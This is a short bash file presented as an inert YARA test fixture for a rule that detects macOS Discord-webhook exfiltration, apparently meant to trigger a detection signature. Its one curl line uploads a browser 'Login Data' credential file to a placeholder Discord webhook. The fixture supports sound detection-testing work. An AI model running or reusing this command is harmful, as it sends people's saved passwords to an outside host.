#!/bin/bash
# Inert YARA fixture for CERBER_MacOS_Discord_Webhook_Exfil - text only, not a working sample.
HOOK=https://discord.com/api/webhooks/111111111111111111/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
curl -s -F "file=@/tmp/Login Data" "$HOOK"
